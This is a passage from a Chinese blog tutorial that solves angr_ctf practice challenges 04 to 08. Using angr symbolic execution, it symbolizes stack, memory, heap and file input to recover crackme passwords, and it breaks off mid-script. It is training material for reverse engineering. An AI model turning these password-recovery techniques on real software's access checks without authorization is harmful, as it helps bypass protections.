10h</code>之后，我们观察一下输入，可以看到<code>v2</code>最先被输入，然后便是<code>v1</code>，因此<code>v2</code>所在的栈空间是位于<code>v1</code>下方的 ( 栈向上增长 )。我们每次初始化栈时并不会有数据，而<code>v1</code>处于栈空间的中间，因此我们需要一个<code>padding</code>来帮我们覆写到对应<code>v1</code>所在的空间内。示意图如下：</p><img src="https://s2.loli.net/2022/03/16/HZsvVBq3kFjI2PL.png" style="zoom: 67%;" /><p><code>v1</code>距离栈顶还有<code>0x8</code>的空间，我们初始化栈时的<code>padding</code>将上面的<code>0x8</code>字节空间进行填充，之后的栈空间地址便是我们输入的<code>v1</code>地址。那么怎么进行初始化栈呢？栈开始时我们是将<code>EBP</code>和<code>ESP</code>两个栈指针的地址相等，然后入栈时栈顶指针<code>ESP</code>增加，我们在这个过程中是对栈进行了模拟操作，那么在<code>angr</code>中也有相应的模拟方式来实现模拟栈的初始化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">initial_state.regs.ebp = initial_state.regs.esp <span class="hljs-comment"># 初始化栈，令ebp等于esp</span><br><br>password0 = claripy.BVS(<span class="hljs-string">&#x27;password0&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 初始化两个位向量</span><br>password1 = claripy.BVS(<span class="hljs-string">&#x27;password1&#x27;</span>, <span class="hljs-number">32</span>)<br><br>padding_length_in_bytes = <span class="hljs-number">0x8</span> <span class="hljs-comment"># 填充栈数据 0x8 之后栈空间会在 v1 处</span><br>initial_state.regs.esp -= padding_length_in_bytes <br><br>initial_state.stack_push(password0) <span class="hljs-comment"># 将位向量压入栈中</span><br>initial_state.stack_push(password1)<br><br></code></pre></td></tr></table></figure><p>那么我们便可以把这一连串代码加入到之前的第二题的代码之中，编写出如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> mimetypes <span class="hljs-keyword">import</span> init<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    binary_path = <span class="hljs-string">&#x27;./04_angr_symbolic_stack&#x27;</span><br>    project = angr.Project(binary_path)<br><span class="hljs-comment"># 设置开始地址</span><br>    start_addr = <span class="hljs-number">0x08048697</span><br>    initial_state = project.factory.blank_state(addr=start_addr)<br><br>    initial_state.regs.ebp = initial_state.regs.esp <span class="hljs-comment"># 初始化栈，令ebp等于esp</span><br><br>    password0 = claripy.BVS(<span class="hljs-string">&#x27;password0&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 初始化两个位向量</span><br>    password1 = claripy.BVS(<span class="hljs-string">&#x27;password1&#x27;</span>, <span class="hljs-number">32</span>)<br><br>    padding_length_in_bytes = <span class="hljs-number">0x8</span> <span class="hljs-comment"># 填充栈</span><br>    initial_state.regs.esp -= padding_length_in_bytes <span class="hljs-comment"># 从栈顶减去对应的 padding 使栈空间到 v1 处</span><br><span class="hljs-comment"># 将位向量压入栈中</span><br>    initial_state.stack_push(password0) <span class="hljs-comment"># v1</span><br>    initial_state.stack_push(password1) <span class="hljs-comment"># v2</span><br><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        solution0 = solution_state.se.<span class="hljs-built_in">eval</span>(password0)<br>        solution1 = solution_state.se.<span class="hljs-built_in">eval</span>(password1)<br><br>        solution = <span class="hljs-string">&#x27;%u %u&#x27;</span> % (solution0, solution1)<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>在这个题目中我们学会了如何符号化栈空间，我们通过填充部分<code>padding</code>使我们的输入数据处于栈顶 ( 绕过了输入 )，同时与符号化寄存器相结合，让<code>angr</code>进行模拟，来代替输入的输入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">initial_state.regs.ebp = initial_state.regs.esp <span class="hljs-comment"># 初始化栈，令ebp等于esp</span><br><br>password0 = claripy.BVS(<span class="hljs-string">&#x27;password0&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 初始化向量</span><br>password1 = claripy.BVS(<span class="hljs-string">&#x27;password1&#x27;</span>, <span class="hljs-number">32</span>)<br><br>padding_length_in_bytes = XXX <span class="hljs-comment"># 填充栈数据 0x8 之后栈空间会在 v1 处</span><br>initial_state.regs.esp -= padding_length_in_bytes <span class="hljs-comment"># 从栈顶减去 padding 的数据大小</span><br><br>initial_state.stack_push(password0) <span class="hljs-comment"># 将位向量压入栈中</span><br>initial_state.stack_push(password1)<br></code></pre></td></tr></table></figure><h2 id="05-angr-symbolic-memory">05_angr_symbolic_memory</h2><p>看到题目便是我们要学习的符号化内存空间，观察一下输入的数据所在的位置，可以看到其处于在<code>bss</code>段上，属于一个内存区域内，我们所需要做的便是符号化内存空间。</p><img src="https://s2.loli.net/2022/03/17/g2biEX8QadlMcAj.png" style="zoom:80%;" /><p>与符号化栈空间有一点类似，我们需要设置 4 个符号向量来进行模拟输入，然后想办法将其放在内存空间里，<code>angr</code>提供有对应把符号项量放在内存中的函数，我们可以直接通过调用来对内存空间进行符号化。但在这之前我们需要找到<code>bss</code>段每个输入数据所在的地址值，将对应的地址传入到栈空间里。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 对应参数值为符号化的地址，和符号化的参数名</span><br>initial_state.memory.store(password_addr, password)<br></code></pre></td></tr></table></figure><p>其余部分和前面一个题的符号化栈空间是十分相像的，需要我们对输入进行符号化处理，然后将其地址和参数名传入到内存段即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    binary_path = <span class="hljs-string">&#x27;../program/05_angr_symbolic_memory&#x27;</span><br>    project = angr.Project(binary_path)<br><br>    start_addr = <span class="hljs-number">0x08048601</span><br>    initial_state = project.factory.blank_state(addr=start_addr)<br><br>    password0 = claripy.BVS(<span class="hljs-string">&#x27;password0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 64 = 8(8个字符) * 1(每个字符一字节) * 8(每个字节8比特)</span><br>    password1 = claripy.BVS(<span class="hljs-string">&#x27;password1&#x27;</span>, <span class="hljs-number">64</span>)<br>    password2 = claripy.BVS(<span class="hljs-string">&#x27;password2&#x27;</span>, <span class="hljs-number">64</span>)<br>    password3 = claripy.BVS(<span class="hljs-string">&#x27;password3&#x27;</span>, <span class="hljs-number">64</span>)<br><br>    password0_addr = <span class="hljs-number">0x09FD92A0</span><br>    password1_addr = <span class="hljs-number">0x09FD92A8</span><br>    password2_addr = <span class="hljs-number">0x09FD92B0</span><br>    password3_addr = <span class="hljs-number">0x09FD92B8</span><br><br>    initial_state.memory.store(password0_addr, password0) <span class="hljs-comment"># 将位向量存入内存</span><br>    initial_state.memory.store(password1_addr, password1)<br>    initial_state.memory.store(password2_addr, password2)<br>    initial_state.memory.store(password3_addr, password3)<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        solution0 = solution_state.se.<span class="hljs-built_in">eval</span>(password0)<br>        solution1 = solution_state.se.<span class="hljs-built_in">eval</span>(password1)<br>        solution2 = solution_state.se.<span class="hljs-built_in">eval</span>(password2)<br>        solution3 = solution_state.se.<span class="hljs-built_in">eval</span>(password3)<br>        solution = long_to_bytes(solution0)+<span class="hljs-string">b&#x27; &#x27;</span>+long_to_bytes(solution1)+<span class="hljs-string">b&#x27; &#x27;</span>+long_to_bytes(solution2)+<span class="hljs-string">b&#x27; &#x27;</span>+long_to_bytes(solution3)<br>        <span class="hljs-built_in">print</span>(solution.decode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>不过需要注意的是符号化向量对应的大小应该是对应的<code>bit</code>数据大小，而不是看其字节长度。在这个过程中我们将内存进行了符号化处理，然后将我们的符号化向量传入到<code>bss</code>段中去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, &lt;bit数据大小&gt;) <br>password_addr = XXX<br>initial_state.memory.store(password_addr, password) <span class="hljs-comment"># 将位向量存入内存</span><br></code></pre></td></tr></table></figure><h2 id="06-angr-symbolic-dynamic-memory">06_angr_symbolic_dynamic_memory</h2><p>在这个题目中与上一个题目不同的是题目动态分配了两个指针变量，将我们的输入保存在堆空间上，使得我们需要将堆上的空间进行符号化处理，也就是<code>malloc</code>分配的空间是动态的但是其返回的变量<code>buufer</code>位于<code>bss</code>段，是静态的，那么我们可以伪造指针，使其指向的是一片可写内存，进而符号化处理。</p><img src="https://s2.loli.net/2022/03/17/Lctai5ujnD6fyeq.png" alt="6.png" style="zoom:80%;" /><p>我们可以看到空间内的定义数据都是处于<code>bss</code>段上的，我们便对其想办法来符号化。</p><img src="https://s2.loli.net/2022/03/17/Hju1aqReUd5sgcG.png" style="zoom:80%;" /><p>相当于我们模拟<code>malloc</code>分配地址空间，在<code>bss</code>段里找到一块空的空间来保存我们的输入数据。与此同时我们观察程序入口点可以看到程序在输入后有<code>add esp, 16</code>对<code>scanf</code>的栈空间进行整理，所以我们程序开始的地址为下面一行的<code>0x08048699</code></p><img src="https://s2.loli.net/2022/03/17/tCmpxcrPXI5dBo1.png" alt="8.png" style="zoom:80%;" /><p>接下来我们开始模拟<code>malloc</code>分配地址，并将其保存的输入符号化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 符号化输入</span><br>password0 = claripy.BVS(<span class="hljs-string">&#x27;password0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 64 = 8(8个字符) * 1(每个字符一字节) * 8(每个字节8比特)</span><br>password1 = claripy.BVS(<span class="hljs-string">&#x27;password1&#x27;</span>, <span class="hljs-number">64</span>)<br><br><span class="hljs-comment"># 对应空白 bss 段内空间</span><br>fake0_addr = <span class="hljs-number">0x09FD9160</span> <span class="hljs-comment"># 伪造malloc得来的内存</span><br>fake1_addr = <span class="hljs-number">0x09FD9180</span><br><br><span class="hljs-comment"># 指向伪造内存的指针</span><br>buffer0_addr = <span class="hljs-number">0x09FD92AC</span> <span class="hljs-comment"># 输入的存放地址 buffer0</span><br>buffer1_addr = <span class="hljs-number">0x09FD92B4</span> <span class="hljs-comment"># buffer1</span><br><br><span class="hljs-comment"># 将指针指向伪造的内存</span><br><span class="hljs-comment"># 参数为输入数据存放地址,bss 段伪造的空间</span><br>initial_state.memory.store(buffer0_addr, fake0_addr, endness=project.arch.memory_endness) <br>initial_state.memory.store(buffer1_addr, fake1_addr, endness=project.arch.memory_endness)<br><br><span class="hljs-comment"># 将伪造的内存符号化</span><br>initial_state.memory.store(fake0_addr, password0) <span class="hljs-comment"># bss 段伪造的地址,符号化的输入</span><br>initial_state.memory.store(fake1_addr, password1)<br></code></pre></td></tr></table></figure><p>我们整理一下脚本将符号化动态的内存空间加入到我们的第二题的代码组合便是我们的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> operator <span class="hljs-keyword">import</span> is_<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    binary_path = <span class="hljs-string">&#x27;../program/06_angr_symbolic_dynamic_memory&#x27;</span><br>    project = angr.Project(binary_path)<br><br>    start_addr = <span class="hljs-number">0x08048699</span><br>    initial_state = project.factory.blank_state(addr=start_addr)<br><br>    password0 = claripy.BVS(<span class="hljs-string">&#x27;password0&#x27;</span>, <span class="hljs-number">64</span>)<br>    password1 = claripy.BVS(<span class="hljs-string">&#x27;password1&#x27;</span>, <span class="hljs-number">64</span>)<br>    fake0_addr = <span class="hljs-number">0x09FD9160</span> <span class="hljs-comment"># 伪造malloc得来的内存</span><br>    fake1_addr = <span class="hljs-number">0x09FD9180</span><br><br>    buffer0_addr = <span class="hljs-number">0x09FD92AC</span> <span class="hljs-comment"># 指向伪造内存的指针</span><br>    buffer1_addr = <span class="hljs-number">0x09FD92B4</span><br>    initial_state.memory.store(buffer0_addr, fake0_addr, endness=project.arch.memory_endness) <span class="hljs-comment"># 将指针指向伪造的内存</span><br>    initial_state.memory.store(buffer1_addr, fake1_addr, endness=project.arch.memory_endness)<br><br>    initial_state.memory.store(fake0_addr, password0) <span class="hljs-comment"># 将伪造的内存符号化</span><br>    initial_state.memory.store(fake1_addr, password1)<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        solution0 = solution_state.se.<span class="hljs-built_in">eval</span>(password0)<br>        solution1 = solution_state.se.<span class="hljs-built_in">eval</span>(password1)<br><br>        solution = long_to_bytes(solution0) + <span class="hljs-string">b&#x27; &#x27;</span> + long_to_bytes(solution1)<br>        <span class="hljs-built_in">print</span>(solution)<br>        <span class="hljs-built_in">print</span>(solution.decode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>通过这个题目，我们了解到如何将动态的内存分配的地址进行转换为符号化，我们需要在<code>bss</code>段上找到对应大小的空间来保存我们的输入，然后将符号化后的输入导入到伪装的<code>bss</code>段地址处，之后便可以利用之前符号化内存的方式实现解题，我们学到的关键函数为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 对应空白 bss 段内空间</span><br>fake_addr = XXX <span class="hljs-comment"># 伪造malloc得来的内存</span><br><br><span class="hljs-comment"># 指向伪造内存的指针</span><br>buffer_addr = XXX <span class="hljs-comment"># 输入的存放地址 buffer</span><br><br><span class="hljs-comment"># 将指针指向伪造的内存</span><br><span class="hljs-comment"># 参数为输入数据存放地址,bss 段伪造的空间</span><br>initial_state.memory.store(buffer_addr, fake_addr, endness=project.arch.memory_endness) <br><br><span class="hljs-comment"># 将伪造的内存符号化</span><br>initial_state.memory.store(fake_addr, password) <span class="hljs-comment"># bss 段伪造的地址,符号化的输入</span><br></code></pre></td></tr></table></figure><blockquote><p>参数：<code>endness=project.arch.memory_endness</code><br>在默认情况下，<code>angr</code>使用大端格式往内存中写入整数，这个参数告诉<code>angr</code>使用小端格式写入，这是x86的格式</p></blockquote><h2 id="07-angr-symbolic-file">07_angr_symbolic_file</h2><p>看到题目发现里面是一个文件操作，从文件里进行读取数据，而我们需要将文件进行符号化处理，而<code>angr</code>也提供了对应的封装模块来供我们进行调用处理。下面列出其符号化文件的方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 开始执行地址</span><br>start_addr = XXX<br><br>filename = <span class="hljs-string">&#x27;XXX&#x27;</span> <span class="hljs-comment"># 文件名称</span><br>symbolic_file_size_bytes = <span class="hljs-number">64</span> <span class="hljs-comment"># 文件大小(此处写的是字节),也可以直接写入 bit 之后main初始化向量时不需要 * 8</span><br><br><span class="hljs-comment"># 初始化位向量</span><br>password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, symbolic_file_size_bytes * <span class="hljs-number">8</span>) <span class="hljs-comment"># * 8 将byte进行转换到bits</span><br>password_file = angr.SimFile(filename, content=password, size=symbolic_file_size_bytes) <span class="hljs-comment"># 符号化文件</span><br><br><span class="hljs-comment"># 再初始状态中添加一个虚拟的文件系统</span><br>initial_state = project.factory.blank_state(addr=start_addr, fs=&#123;filename: password_file&#125;) <br></code></pre></td></tr></table></figure><p>那么我们就可以直接在第二题的条件约束上扩展，加入这一串对文件进行格式化的操作指令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    binary_path = <span class="hljs-string">&#x27;../program/07_angr_symbolic_file&#x27;</span><br>    project = angr.Project(binary_path)<br><br>    start_addr = <span class="hljs-number">0x080488EA</span><br><br>    filename = <span class="hljs-string">&#x27;MRXJKZYR.txt&#x27;</span> <span class="hljs-comment"># 文件名称</span><br>    symbolic_file_size_bytes = <span class="hljs-number">64</span> <span class="hljs-comment"># 文件大小(字节)</span><br><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, symbolic_file_size_bytes * <span class="hljs-number">8</span>) <span class="hljs-comment"># 初始化位向量</span><br>    password_file = angr.SimFile(filename, content=password, size=symbolic_file_size_bytes) <span class="hljs-comment"># 符号化文件</span><br><br>    initial_state = project.factory.blank_state(addr=start_addr, fs=&#123;filename: password_file&#125;) <span class="hljs-comment"># 再初始状态中添加一个虚拟的文件系统</span><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        solution = long_to_bytes(solution_state.solver.<span class="hljs-built_in">eval</span>(password))<br>        <span class="hljs-built_in">print</span>(solution.decode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find solution&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>在这节里面我们学会了如何对文件进行符号化，来创建我们的约束求解器，其关键的函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 符号化文件</span><br>password_file = angr.SimFile(filename, content=password, size=symbolic_file_size_bytes)<br><span class="hljs-comment"># 在初始状态添加一个虚拟的文件系统</span><br>initial_state = project.factory.blank_state(addr=start_addr, fs=&#123;filename: password_file&#125;)<br></code></pre></td></tr></table></figure><h2 id="08-angr-constraints">08_angr_constraints</h2><p>把程序拖入进<code>IDA</code>进行分析可以得到如下伪代码，可以看出程序将我们对输入在经过加密后与字符串<code>MRXJKZYRKMKENFZB</code>进行比较值，我们可以轻松的看出目的的比较，但是<code>angr</code>是遍历各个分支来进行模拟的，因此时间开销十分大，我们需要将其进行减小模拟的过程分支来缩短模拟的时间。</p><p><img src="https://s2.loli.net/2022/03/17/TfV1sUr6uHZ4Kwv.png" alt=""></p><p>那么需要怎么操作？我们可以将<code>buffer</code>进行符号化处理，然后让程序来替代我们加密，之后我们切换到<code>angr</code>中，由我们来对加密后的数据进行检验，看是否与目的字符串相等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 前半段与之前的方式一样，对输入的数据符号化，载入内存</span><br><span class="hljs-comment"># 之后进行模拟到检查函数之前</span><br>addr_to_check_constraint = <span class="hljs-number">0x08048669</span><br>simulation.explore(find=addr_to_check_constraint)<br></code></pre></td></tr></table></figure><p>此时我们需要转移到判断加密后的数据上：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 